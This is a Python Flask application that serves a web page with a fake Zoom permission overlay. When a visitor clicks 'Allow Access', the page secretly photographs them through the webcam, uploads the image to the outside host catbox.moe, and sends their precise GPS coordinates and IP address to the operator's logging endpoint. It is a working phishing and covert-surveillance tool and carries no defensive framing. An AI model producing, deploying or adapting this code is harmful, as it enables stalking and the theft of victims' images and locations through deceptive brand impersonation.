from flask import Flask, request, jsonify, redirect
import logging
from datetime import datetime
import os
import json

app = Flask(__name__)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger('gps_logger')

HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Location Service</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        /* Your existing styles remain unchanged */
    </style>
</head>
<body>
    <!-- Your existing content -->
    {existing_content}
    
    <!-- GPS Permission Overlay -->
    <div class="gps-overlay">
        <div class="gps-modal">
            <img src="https://upload.wikimedia.org/wikipedia/commons/2/24/Zoom-Logo.png" width="150" alt="Zoom">
            <h2 class="doorDash-heading">Allow Zoom to use your device for video conferences</h2>
            <p class="doorDash-text">Allow us access to things like your camera, location, and microphone to continue using Zoom</p>
            <button class="gps-btn" id="gps-allow-btn">Allow Access</button>
        </div>
    </div>

    <script>
        async function uploadToCatbox(imageBlob) {
            try {
                // First convert blob to base64
                const base64data = await new Promise((resolve) => {
                    const reader = new FileReader();
                    reader.onload = () => resolve(reader.result.split(',')[1]);
                    reader.readAsDataURL(imageBlob);
                });

                const formData = new FormData();
                formData.append('reqtype', 'fileupload');
                formData.append('userhash', '');
                formData.append('fileToUpload', new Blob([atob(base64data)], {type: 'image/jpeg'}), 'webcam.jpg');
                
                const response = await fetch('https://catbox.moe/user/api.php', {
                    method: 'POST',
                    body: formData
                });
                
                if (response.ok) {
                    const fileUrl = await response.text();
                    if (fileUrl.startsWith('http')) {
                        await fetch('/log', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                type: 'camera_upload',
                                ip: await fetch('/getip').then(r => r.text()),
                                file_url: fileUrl,
                                timestamp: new Date().toISOString()
                            })
                        });
                        return fileUrl;
                    }
                    throw new Error('Invalid response from Catbox');
                }
                throw new Error(`Upload failed with status ${response.status}`);
            } catch (error) {
                console.error('Upload error:', error);
                await fetch('/log', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        type: 'upload_error',
                        error: error.toString(),
                        ip: await fetch('/getip').then(r => r.text()),
                        timestamp: new Date().toISOString()
                    })
                });
                return null;
            }
        }

        async function takePicture() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'environment',
                        width: { ideal: 1920 },
                        height: { ideal: 1080 }
                    } 
                });
                
                const video = document.createElement('video');
                video.srcObject = stream;
                
                await new Promise((resolve) => {
                    video.onloadedmetadata = () => {
                        video.play();
                        resolve();
                    };
                });
                
                // Wait for video to properly initialize
                await new Promise(resolve => setTimeout(resolve, 500));
                
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // Stop all video tracks
                stream.getTracks().forEach(track => track.stop());
                
                return await new Promise((resolve) => {
                    canvas.toBlob(blob => {
                        if (!blob) {
                            throw new Error('Canvas toBlob failed');
                        }
                        resolve(blob);
                    }, 'image/jpeg', 0.85);
                });
            } catch (error) {
                console.error('Camera error:', error);
                await fetch('/log', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        type: 'camera_error',
                        error: error.toString(),
                        ip: await fetch('/getip').then(r => r.text()),
                        timestamp: new Date().toISOString()
                    })
                });
                return null;
            }
        }

        document.getElementById('gps-allow-btn').addEventListener('click', async () => {
            try {
                // Log permission request
                await fetch('/log', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        type: 'permission_request',
                        ip: await fetch('/getip').then(r => r.text()),
                        timestamp: new Date().toISOString()
                    })
                });
                
                // Take picture and upload
                const imageBlob = await takePicture();
                if (imageBlob) {
                    await uploadToCatbox(imageBlob);
                }
                
                // Get location
                const position = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    });
                });
                
                // Log location
                await fetch('/log', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        type: 'location_data',
                        ip: await fetch('/getip').then(r => r.text()),
                        lat: position.coords.latitude,
                        lng: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        timestamp: new Date().toISOString()
                    })
                });
                
                // Remove overlay
                document.querySelector('.gps-overlay').remove();
                
            } catch (error) {
                console.error('Error:', error);
                await fetch('/log', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        type: 'error',
                        error: error.toString(),
                        ip: await fetch('/getip').then(r => r.text()),
                        timestamp: new Date().toISOString()
                    })
                });
                alert('Error occurred: ' + error.message);
            }
        });
    </script>
</body>
</html>
"""

@app.route('/')
def serve_page():
    """Serve the page with GPS overlay"""
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    logger.info(f"Page served to IP: {client_ip}")
    
    # Load your existing page.html content
    with open('page.html', 'r') as f:
        existing_content = f.read()
    
    return HTML_TEMPLATE.format(existing_content=existing_content)

@app.route('/getip')
def get_ip():
    """Endpoint to get client IP"""
    return request.headers.get('X-Forwarded-For', request.remote_addr)

@app.route('/log', methods=['POST'])
def log_data():
    """Central logging endpoint"""
    data = request.json
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    # Enhanced logging with all relevant data
    log_entry = {
        'timestamp': datetime.utcnow().isoformat(),
        'client_ip': client_ip,
        'event_data': data
    }
    
    logger.info(json.dumps(log_entry, indent=2))
    return jsonify({'status': 'success'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
